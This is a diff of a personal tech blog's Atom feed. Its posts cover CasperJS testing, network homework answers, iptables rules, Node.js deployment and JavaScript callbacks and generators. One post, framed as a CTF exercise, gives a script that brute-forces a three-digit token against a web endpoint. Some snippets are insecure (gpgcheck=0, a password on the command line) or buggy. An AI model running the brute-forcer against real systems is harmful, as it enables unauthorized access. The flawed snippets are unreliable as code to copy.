+            <span class="k">this</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+                <span class="nx">dispatch</span><span class="p">();</span> <span class="c1">// manually submit the form</span>
+            <span class="p">});</span>
+            <span class="nx">casper</span><span class="p">.</span><span class="nx">waitForPopup</span><span class="p">(</span><span class="sr">/google\.com/</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">assertEquals</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">popups</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="p">})</span>
+            <span class="nx">casper</span><span class="p">.</span><span class="nx">withPopup</span><span class="p">(</span><span class="sr">/google\.com/</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">capture</span><span class="p">(</span><span class="s2">&quot;search.png&quot;</span><span class="p">);</span>
+                <span class="nx">test</span><span class="p">.</span><span class="nx">assertTitleMatch</span><span class="p">(</span><span class="sr">/Google/</span><span class="p">,</span> <span class="s2">&quot;Title is right!&quot;</span><span class="p">);</span>
+                <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+                    <span class="c1">// we are in DOM!</span>
+                    <span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;q&quot;]&#39;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+                <span class="p">});</span>
+                <span class="nx">test</span><span class="p">.</span><span class="nx">assertEquals</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="s1">&#39;site:v2ex.com/t casper&#39;</span><span class="p">);</span>
+            <span class="p">});</span>
+        <span class="p">});</span>
+    <span class="p">}).</span><span class="nx">run</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">test</span><span class="p">.</span><span class="nx">done</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</pre></div>
+<p>Here, as <code>CasperJS</code> can&#39;t submit the search form on <code>v2ex</code>, we should manually submit
+the form by call <code>dispatch()</code> function after fill the search input. We use <code>evaluate()</code>
+to run code in the current page DOM context(we are in DOM!). Then <code>v2ex</code> will popup a 
+google hacking result for your search keywords, like <code>site:v2ex.com/t casper</code> here. 
+So there we need <code>waitForPopup</code> and <code>withPopup</code>.</p>
+<p>Actually, <code>CasperJS</code> has a fucking awesome <a href="http://docs.casperjs.org/en/latest/">doc</a>
+that I strongly recommend you to read about it. You may need it when you stuck.</p>
+
+<h2 id="toc_7">Summary</h2>
+<p><code>Unit tests</code> are written from the developer’s perspective, and typically target a method 
+or a class. While <code>Functional tests</code> are written from the user’s perspective, and usually 
+test the interaction between multiple building blocks of the application. Your application
+would be better with both a comprehensive suite of <code>Unit tests</code> as well as a bunch of 
+<code>Functional tests</code>. </p>
+
+<blockquote>
+<p>Unit testing makes sure you are using quality ingredients. Functional testing makes sure your application doesn&#39;t taste like crap. </p>
+</blockquote>
+
+<h2 id="toc_8">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_9">References:</h3>
+
+<ul>
+<li><a href="https://brianstoner.com/blog/testing-in-nodejs-with-mocha/">testing-in-nodejs-with-mocha</a></li>
+<li><a href="http://www.helpscout.net/blog/functional-testing-casperjs/">functional-testing-casperjs</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Computer Network and Communication]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/computer-network-and-communication-1"/>
+        <published>2014-10-18T00:00:00+08:00</published>
+        <updated>2014-10-18T15:22:37+08:00</updated>
+        <id>http://tinple.io/tech/computer-network-and-communication-1</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h1 id="toc_0">Computer Networks</h1>
+
+<h2 id="toc_1">Chapter 1 problems:</h2>
+
+<h3 id="toc_2">Question 1:</h3>
+<p>Imagine that you have trained your St. Bernard, Bernie, to carry a box of three 8mm tapes instead of a flask of brandy. (When your disk fills up, you consider that an emergency.) These tapes each contain 7 gigabytes. The dog can travel to your side, wherever you may be, at 18 km/hour. For what range of distances does Bernie have a higher data rate than a transmission line whose data rate (excluding overhead) is 150 Mbps?</p>
+
+<h3 id="toc_3">Answer:</h3>
+
+<pre><code>The dog can carry 3 * 7 = 21 gigabytes (168 gigabits)
+Speed = 18 km/hour = 0.005 km/sec
+Distance: x km
+Time: x / 0.005 = 200x sec
+Hence, 168 / 200x Gbps or 840 / x Mbps.
+For x &lt; 5.6 km, the dog has higher rate than the communication line.</code></pre>
+
+<h3 id="toc_4">Question 6:</h3>
+<p>A client-server system uses a satellite network, with the satellite at a height of 40,000 km. What is the best-case delay in response to a request?</p>
+
+<h3 id="toc_5">Answer:</h3>
+
+<pre><code>Request distance: 40000 * 2 = 80000 km
+Response distance: 40000 * 2 = 80000 km
+Total distance: 80000 + 80000 = 160000 km
+The speed of light: 300000 km/sec
+Delay: 160000 / 300000 = 533 msec</code></pre>
+
+<h3 id="toc_6">Question 10:</h3>
+<p>A disadvantage of a broadcast subnet is the capacity wasted when multiple hosts attempt to access the channel at the same time. As a simplistic example, suppose that time is divided into discrete slots, with each of the n hosts attempting to use the channel with probability p during each slot. What fraction of the slots are wasted due to collisions?</p>
+
+<h3 id="toc_7">Answer:</h3>
+
+<pre><code>There are two situations without collisions.
+1. Successful transmission. n * p * (1 - p) ^ (n - 1)
+2. All stations are idle. (1 - p) ^ n
+Hence, the fraction that are wasted is
+1 - n * p * (1 - p) ^ (n - 1) - (1 - p) ^ n</code></pre>
+
+<h3 id="toc_8">Question 20:</h3>
+<p>A system has an n-layer protocol hierarchy. Applications generate messages of length M bytes. At each of the layers, an h-byte header is added. What fraction of the network bandwidth is filled with headers?</p>
+
+<h3 id="toc_9">Answer:</h3>
+
+<pre><code>The total number of header bytes: n * h
+The total packet size: n * h + M
+Hence, the fraction of each packet used by protocol header is 
+[n * h / (M + n * h)]</code></pre>
+
+<h3 id="toc_10">Question 27:</h3>
+<p>How long was a bit on the original 802.3 standard in meters? Use a transmission speed of 10 Mbps and assume the propagation speed in coax is 2/3 the speed of light in vacuum.</p>
+
+<h3 id="toc_11">Answer:</h3>
+
+<pre><code>The speed of light in coax: 200000 km/sec (200 meter/μsec).
+At 10Mbps, it takes 0.1μsec to transmit a bit.
+0.1 * 200 = 20 meters.
+Hence, a bit is 20 meters long here.</code></pre>
+
+<h3 id="toc_12">Question 28:</h3>
+<p>An image is 1024 x 768 pixels with 3 bytes/pixel. Assume the image is uncompressed. How long does it take to transmit it over a 56-kbps modem channel? Over a 1-Mbps cable modem? Over a 10-Mbps Ethernet? Over 100-Mbps Ethernet?</p>
+
+<h3 id="toc_13">Answer:</h3>
+
+<pre><code>The image is 1024 * 768 * 3 = 2359296 bytes = 18874368 bits
+a. 56-kbps: 337.042 sec
+b. 1-Mbps: 18.874 sec
+c. 10-Mbps: 1.887 sec
+d. 100-Mbps: 0.189 sec</code></pre>
+
+<h1 id="toc_14">Data and computer communication</h1>
+
+<h2 id="toc_15">Chapter 2 problems:</h2>
+
+<h3 id="toc_16">Question 2:</h3>
+<p>a.The French and Chinese prime ministers need to come to an agreement by telephone, but neither speaks the other’s language. Further, neither has on hand a translator that can translate to the language of the other. However, both prime ministers have English translators on their staffs. Draw a diagram similar to Figure 2.12 to depict the situation, and describe the interaction and each level.</p>
+<p>b. Now suppose that the Chinese prime minister’s translator can translate only into Japanese and that the French prime minister has a German translator available. A translator between German and Japanese is available in Germany. Draw a new diagram that reflects this arrangement and describe the hypothetical phone conversation.</p>
+
+<h3 id="toc_17">Answer:</h3>
+<p>  a. Picture</p>
+
+<pre><code>----------------------           ----------------------
+|Chinese prime ministers|        |French prime ministers|
+-----------------------          ----------------------
+|  Chinese Translator   |        |   French Translator  |
+-----------------------          ----------------------
+|        Telephone      |        |     Telephone        |
+---------------------------------------------------------
+                       Telephone Line
+---------------------------------------------------------</code></pre>
+<p>b. Picture</p>
+
+<pre><code>----------------                           -----------------
+|China  ministers|                         |French ministers |
+ -----------------   -------------------    -----------------
+|China Translator|  |Germany Translator |  |French Translator|
+ -----------------   -------------------    -----------------
+|   Telephone    |  |Telephone|Telephone|  |     Telephone   |
+ ------------------------------------------------------------
+  Chinese and German                        French and German
+    Telephone Line                            Telephone Line
+  ------------------                        -----------------</code></pre>
+
+<h3 id="toc_18">Question 3:</h3>
+<p>List the major disadvantages with the layered approach to protocols.</p>
+
+<h3 id="toc_19">Answer:</h3>
+<p>The layered protocols may cause the processing and data overhead. And with so many layers,
+it takes a long time to develop and promulgate the standards.</p>
+
+<h3 id="toc_20">Question 4:</h3>
+<p>Two blue armies are each poised on opposite hills preparing to attack a single red army in the valley. The red army can defeat either of the blue armies separately but will fail to defeat both blue armies if they attack simultaneously. The blue armies communicate via an unreliable communications system (a foot soldier). The commander with one of the blue armies would like to attack at noon. His problem is this: If he sends a message to the other blue army, ordering the attack, he cannot be sure it will get through. He could ask for acknowledgment, but that might not get through. Is there a protocol that the two blue armies can use to avoid defeat? </p>
+
+<h3 id="toc_21">Answer:</h3>
+<p>No. There is no way to be assured that the last message gets through, except by acknowledging it. </p>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Work with IPTables]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/work-with-iptables"/>
+        <published>2014-09-25T00:00:00+08:00</published>
+        <updated>2014-09-28T10:54:14+08:00</updated>
+        <id>http://tinple.io/tech/work-with-iptables</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Nowadays I happened to <code>IPTables</code> again. To be honest, I&#39;m not familiar with it.
+This post is just my note about working with <code>IPTables</code> these days.</p>
+
+<h2 id="toc_0">What&#39;s iptables?</h2>
+<p><code>CentOS</code> has a powerful firewall, that&#39;s called <code>iptables</code>, aka <code>iptables/netfilter</code>.
+It&#39;s the userscope module, and <code>netfilter</code> is a kernel module, built into the kernel,
+that actually does the filtering.</p>
+<p><code>IPTables</code> places rules into predefined chains(INPUT, OUTPUT and FORWORD) that are 
+checked against any traffic(IP packets) relevant to those chains. And a decision is
+made about what to do with each packet based upon the outcome of those rules, for 
+example, accepting or dropping.</p>
+
+<h2 id="toc_1">Chains</h2>
+<p>There are 3 predefined chains in the filter table to which we can add rules for 
+processing IP packets passing through those chains.</p>
+
+<ul>
+<li>INPUT - All packets destined for the host computer.</li>
+<li>OUTPUT - All packets originating from the host computer.</li>
+<li>FORWARD - All packets neither destined for nor originating the host, but passing 
+through the host computer.</li>
+</ul>
+<p>A packet is checked against each rule in turn, starting at the top, and if it 
+matches the rule, then an action is taken such as accepting(ACCEPT) or dropping
+(DROP) the packet. Once a rule has been matched and an action taken, then the 
+packet is processed according to the outcome of that rule and isn&#39;t processed by
+further rules in the chain.</p>
+
+<h2 id="toc_2">Begin Start</h2>
+<p>We can use <code>iptables -L</code> to inspect the currently loaded rules.
+This is <a href="http://www.aliyun.com">aliyun</a> server, we can see the default set
+of rules. The default set seems that the firewall is the same as closed.</p>
+
+<pre><code>Chain INPUT (policy ACCEPT)
+target     prot opt source               destination
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination</code></pre>
+<p>P.S. If <code>iptables</code> is not running, you can enable it by running:</p>
+
+<pre><code># system-config-securitylevel</code></pre>
+
+<h2 id="toc_3">Server Setups</h2>
+<p>At first, I&#39;ll explain our server setups. We have 5 servers totally.
+And we use <a href="https://www.digitalocean.com/community/tutorials/5-common-server-setups-for-your-web-application">Load Balancer</a> policy to setup our servers:</p>
+
+<ol>
+<li>One Load Balancer Server(Reverse Proxy)</li>
+<li>Three app-backend Servers</li>
+<li>One Database Server</li>
+</ol>
+<p>OK, it&#39;s time to go start. At first, we decide the following basic <code>iptables</code> policies.
+For Reverse Proxy server, we only open port 22 and 80, allowing tcp packets that
+have specific bits(flags) set, to match a rule. For three app-backend servers, we
+just open port 22 and 80. For database server, we open the port 22 and database port.</p>
+
+<h2 id="toc_4">Set IPTables Rule (Load Balancer Server)</h2>
+<p>At first, we may add a rule allowing SSH connections over tcp port 22. This is to 
+prevent accidental lockouts when working on remote systems over an SSH connection.</p>
+
+<pre><code># iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</code></pre>
+<p>And the same as HTTP connections over tcp port 80.</p>
+
+<pre><code># iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code></pre>
+<p>Then we may allow all incoming packets destined for the localhost interface to be
+accepted. This is generally required as many software applications expect to be
+able to communicate with the localhost adaptor.</p>
+
+<pre><code># iptables -A INPUT -i lo -j ACCEPT</code></pre>
+<p>After these basic setting rules, we add three tcp packets that have specific bits
+(flags) rules.</p>
+
+<pre><code># -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG -j DROP 
+# -A INPUT -p tcp -m tcp ! --tcp-flags FIN,SYN,RST,ACK SYN -m state --state NEW -j DROP
+# -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP</code></pre>
+<p>Then we add the last rule to the INPUT chain. <code>ESTABLISHED</code> and <code>RELATED</code> refers to
+incoming packets that are part of an already established connection or related to
+and already established connection.</p>
+
+<pre><code># iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code></pre>
+<p>At last, we set the default policy on the INPUT chain and FORWARD chain.</p>
+
+<pre><code># iptables -P INPUT DROP
+# iptables -P FORWARD DROP</code></pre>
+<p>Now we can see our <code>iptables</code> setting.</p>
+
+<pre><code># iptables -S
+-P INPUT DROP
+-P FORWARD DROP
+-P OUTPUT ACCEPT
+-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG -j DROP
+-A INPUT -p tcp -m tcp ! --tcp-flags FIN,SYN,RST,ACK SYN -m state --state NEW -j DROP
+-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code></pre>
+<p>It seems fine, and our iptables on <code>Reverse Proxy Server</code> needs to be saved.</p>
+
+<pre><code># /sbin/service iptables save</code></pre>
+<p>For other three app-backend servers:</p>
+
+<pre><code># iptables -S
+-P INPUT DROP
+-P FORWARD DROP
+-P OUTPUT ACCEPT
+-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code></pre>
+<p>And the database server:</p>
+
+<pre><code># iptables -S
+-P INPUT DROP
+-P FORWARD DROP
+-P OUTPUT ACCEPT
+-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport [Your_database_port] -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</code></pre>
+
+<h2 id="toc_5">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_6">References:</h3>
+
+<ul>
+<li><a href="http://wiki.centos.org/HowTos/Network/IPTables">wiki-centos-iptables</a></li>
+<li><a href="http://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-iptables.html">ch-iptables</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Nodejs in production]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/nodejs-in-production"/>
+        <published>2014-09-24T00:00:00+08:00</published>
+        <updated>2014-10-26T17:29:41+08:00</updated>
+        <id>http://tinple.io/tech/nodejs-in-production</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Last two days, I deploy a <code>nodejs</code> production environment on a vps.
+The process is hard but fun. Hence, I post this essay to note.
+My project is based on <a href="http://koajs.com">koa</a>, using 
+<a href="https://www.mongodb.org/">mongodb</a> to store data.</p>
+<p>As we know, when running a node application in production, we need
+to keep stability, performance, security, and maintainability in mind.</p>
+
+<h2 id="toc_0">Begin</h2>
+<p>At begin, my initial idea is to use <code>nginx</code> to proxy <code>nodejs</code> app. And the
+<code>nginx</code> plays a <strong>Load Balancer</strong> role, improving performance and
+reliability by distributing the workload across multiple servers,
+working as a front end server. What&#39;s more, your static files 
+can also be handled much better.</p>
+
+<h2 id="toc_1">Install Node.js &amp;&amp; MongoDB</h2>
+
+<h3 id="toc_2">Node.js</h3>
+<p>My vps is <code>CentOS</code>, the first thing we need to do is to install <code>node</code>.</p>
+<p>P.S. As I use <a href="http://koajs.com">koa</a>, so I install version 0.11.9.</p>
+
+<pre><code>$ wget http://nodejs.org/dist/v0.11.9/node-v0.11.9.tar.gz
+$ tar zxvf node-v0.11.9.tar.gz
+$ cd node-v0.11.9
+$ ./configure
+$ make
+$ sudo make install</code></pre>
+<p>After these things done, we can check our install.</p>
+
+<pre><code>$ node -v
+0.11.9
+$ npm -v
+1.3.15</code></pre>
+
+<h3 id="toc_3">MongoDB</h3>
+<p>For <code>Mongo</code>, we can follow the official installation with <code>RedHat</code>.</p>
+
+<pre><code>$ vim /etc/yum.repos.d/mongodb.repo</code></pre>
+<p>For 64-bit system, add the following information to the repo file.</p>
+
+<pre><code>[mongodb]
+name=MongoDB Repository
+baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64
+gpgcheck=0
+enabled=1</code></pre>
+<p>Now to install <code>MongdoDB</code>.</p>
+
+<pre><code>yum install mongo-10gen mongo-10gen-server</code></pre>
+<p>In my production, we need to open the mongod auth, edit <code>/etc/mongod.conf</code>
+to set <code>auth=true</code>.</p>
+<p>And at last, we can use <code>service mongod start</code> or <code>/etc/init.d/mongod start</code>
+to start mongodb.:D</p>
+
+<h2 id="toc_4">nginx.conf</h2>
+<p>As the idea above, we need to configure <code>nginx.conf</code> to proxy our app.
+As I&#39;ll explain, nginx is used for almost everything: gzip encoding,
+static file serving, HTTP caching, SSL handling, load balancing and
+spoon feeding clients. Here is my main nginx config:</p>
+
+<pre><code>http {
+    ...
+    server {
+        listen 80;
+        server_name reg.hduisa.cn;
+
+        location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
+            root /home/wwwroot/reg.hduisa.cn/public;
+            access_log off;
+            expires max;
+        }
+
+        location / {
+            proxy_pass http://127.0.0.1:3000/;
+        }
+
+        access_log /home/wwwlogs/req.hduisa.cn.log access;
+    }
+    ...
+}</code></pre>
+<p>The most important part of the section is <code>proxy_pass</code>, this tells nginx to proxy
+correctly. And for static assets, any requests for with a URI starting with images,
+img, css, js&hellip;will be matched by this location. If you want to proxy multi apps, 
+you can use <code>upstream</code>. The upstream directive specifies that these two instances 
+work in tandem as an upstream server for nginx(not only two).</p>
+
+<pre><code>http {
+    ...
+    upstream reg_hduisa_cn_upstream {
+        server 127.0.0.1:3000;
+        server 127.0.0.1:3001;
+        keepalive 64;
+    }
+    server {
+        ...
+        location / {
+            proxy_pass http://reg_hduisa_cn_upstream;
+        }
+        ...
+    }   
+}</code></pre>
+<p>Now we can pay attention to our app. At first, we should create a user.</p>
+
+<h2 id="toc_5">Create Web User</h2>
+<p>For the security of our server, we should not run the app with root. So I create
+a web user for my own.</p>
+
+<pre><code>$ useradd -mrU koa -p password
+$ su koa</code></pre>
+<p>And I use <code>pm2</code> to manage my app. We need install it.
+And for globally npm install, we can detect whether the <code>$NODE_PATH</code> includes 
+the location that npm installs globally or not.</p>
+
+<pre><code>$ which node
+/usr/local/bin/node
+$ which npm
+/usr/local/bin/npm
+$ echo $NODE_PATH</code></pre>
+<p>My <code>$NODE_PATH</code> is null, so add </p>
+
+<pre><code>export NODE_PATH=/usr/local/lib/node_modules</code></pre>
+<p>to my <code>.bash_profile</code> or <code>.zshrc</code>. The path is not absolute, it depends 
+on your node directory. Now we can install pm2 globally.</p>
+
+<pre><code>$ npm install pm2 -g</code></pre>
+<p>As my koa app needs <code>--harmony</code> flag, we use pm2 to start.</p>
+
+<pre><code>$ pm2 start /home/wwwroot/reg.hduisa.cn/app.js --name reg.hduisa.cn --node-args=&quot;--harmony-generators&quot; --watch</code></pre>
+<p>OK, that&#39;s the whole thing, you can see the process by</p>
+
+<pre><code>$ pm2 list</code></pre>
+
+<h2 id="toc_6">End</h2>
+<p>This&#39;s my first deployment with nodejs on production, if you have something to correct,
+welcome to point it:D</p>
+
+<h3 id="toc_7">References:</h3>
+
+<ul>
+<li><a href="http://docs.mongodb.org/manual/tutorial/install-mongodb-on-red-hat-centos-or-fedora-linux/">install-mongodb-on-red-hat-centos</a></li>
+<li><a href="http://blog.carbonfive.com/2014/06/02/node-js-in-production/">nodejs-in-production</a></li>
+<li><a href="http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load/">nodejs-for-production-part-2</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[callbacks with for loop]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/callbacks-with-for-loop"/>
+        <published>2014-08-13T00:00:00+08:00</published>
+        <updated>2014-10-24T12:35:29+08:00</updated>
+        <id>http://tinple.io/tech/callbacks-with-for-loop</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>When I play some ctf games, usually I need to bruteforcing some interface like post a certain length of string which contains numbers and letters. </p>
+<p>Let&#39;s say we have a url <code>www.example.com/hack</code>, we need to get the information after post correct token. We already know the token&#39;s length is three, containing numbers.</p>
+<p>Now we may write payload like this.</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">bruteforcing</span> <span class="o">=</span> <span class="s1">&#39;0123456789&#39;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;request&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;www.example.com/hack&#39;</span><span class="p">;</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">bruteforcing</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">bruteforcing</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">k</span> <span class="o">&lt;</span> <span class="nx">bruteforcing</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">request</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="nx">form</span><span class="o">:</span><span class="p">{</span> <span class="nx">token</span><span class="o">:</span> <span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">+</span> <span class="nx">k</span> <span class="p">}},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">+</span> <span class="nx">k</span><span class="p">);</span>
+          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">})</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>OK, we have our first magical bruteforcing payload ready. 
+Here&#39;s what you think will happen:</p>
+
+<ol>
+<li>in a for loop, post token from 000 to 999</li>
+<li>if find the respond body with keywords <strong>key</strong>, print token and body</li>
+</ol>
+<p>However, <code>Node</code> is asynchronous. The request post will return before it even starts 
+the post. It will return back to your for loop. And your for loop will move on to the
+next file. And the next one.</p>
+<p>We have to wait for the callback. When it&#39;s called, only then do post our next
+number token. In other words, we need to call another function inside our callback.
+And this function needs to start post next number token. Hence, maybe we need
+a recursive function to do this.</p>
+<p>A nice little recursive pattern we can use for this case:</p>
+
+<pre><code>var request = require('request');
+var url = 'www.example.com/hack';
+function bruteforcing(num) {
+    if (num &gt;= 000 &amp;&amp; num &lt;= 999) {
+        request.post(url, {form:{ token: num }}, function (err, res, body) {
+            if (body.indexOf('key') !== -1) {
+              console.log(i + j + k);
+              console.log(body);
+            } else {
+                bruteforcing(++num);
+            }
+        })
+    }
+}
+bruteforcing(000);</code></pre>
+<p>In short, the pattern can be this:</p>
+
+<pre><code>repeater(i) {
+    if (statement) {
+        aysnc(function () {
+            repeater(++i)
+        })
+    }
+}</code></pre>
+
+<h2 id="toc_0">Referemce</h2>
+
+<ul>
+<li><a href="http://www.richardrodger.com/2011/04/21/node-js-how-to-write-a-for-loop-with-callbacks/#.VCJ-ciuSy8Q">How to Write a For Loop With Callbacks</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Harmony generator , for-of and co]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/harmony-generator-and-co"/>
+        <published>2014-05-15T00:00:00+08:00</published>
+        <updated>2014-09-24T15:15:12+08:00</updated>
+        <id>http://tinple.io/tech/harmony-generator-and-co</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0"><em>Begin</em></h2>
+<p>We talk about the new stuff with <code>harmony</code>, so make sure your <code>harmony mode</code> is enabled. With Chrome, go <code>chrome://flags/</code>, search <code>harmony</code> and enable it. With node, you need <code>0.11.*</code> version, and execute <code>node --harmony</code>. For me, I use <a href="https://github.com/visionmedia/n">n</a> to manage my node version, which is powered by TJ.</p>
+
+<h2 id="toc_1"><em>Generator</em></h2>
+<p>These days I was diving into <code>Harmony generator</code>, it is defined in <code>ES6</code>. So what calls generator? Let&#39;s begin with a simple code.</p>
+<div class="highlight"><pre><span class="kd">function</span><span class="o">*</span> <span class="nx">gen</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">yield</span> <span class="nx">index</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">gen</span> <span class="o">=</span> <span class="nx">gen</span><span class="p">();</span>
+<span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">();</span> <span class="c1">// return {value: 0, done: false}</span>
+<span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">();</span> <span class="c1">// return {value: 1, done: false}</span>
+<span class="c1">//...</span>
+</pre></div>
+<p>As you can see, <code>function gen</code> has a method called <strong>next</strong>. This method returns an object with two properties: value and done. The value can be any value, and the done will be read as a boolean to distinguish whether the iterator has already to the end.</p>
+<p>A simple iterator implement:</p>
+<div class="highlight"><pre><span class="kd">function</span> <span class="nx">gen</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">return</span> <span class="p">{</span>
+        <span class="nx">next</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="nx">array</span><span class="p">.</span><span class="nx">length</span> <span class="o">?</span>
+                <span class="p">{</span><span class="nx">vale</span><span class="o">:</span> <span class="nx">array</span><span class="p">[</span><span class="nx">index</span><span class="o">++</span><span class="p">],</span> <span class="nx">done</span><span class="o">:</span> <span class="kc">false</span><span class="p">}</span> <span class="o">:</span>
+                <span class="p">{</span><span class="nx">done</span><span class="o">:</span> <span class="kc">true</span><span class="p">};</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
